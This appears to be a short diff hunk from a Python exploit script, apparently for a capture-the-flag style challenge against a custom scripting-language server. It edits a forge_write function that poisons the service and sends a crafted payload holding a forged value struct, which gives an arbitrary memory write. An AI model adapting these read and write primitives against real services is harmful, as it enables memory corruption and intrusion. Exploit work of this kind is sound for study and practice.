@@ -246,7 +246,7 @@ def forge_read(host, port, addr, length):
 def forge_write(host, port, addr, data):
     poison(host, port)
     val = struct.pack("<qqq", 2, len(data), addr)           # Val{STR, len, addr}
-    body = (b'summon $f = "' + esc(val) + b'"; summon $d = "' + esc(data) +
+    body = (b'summon $f = "' + esc(val) + b'"; whisper "PRE"; summon $d = "' + esc(data) +
             b'"; echo_write($d);')
     return seance(host, port, body)
 
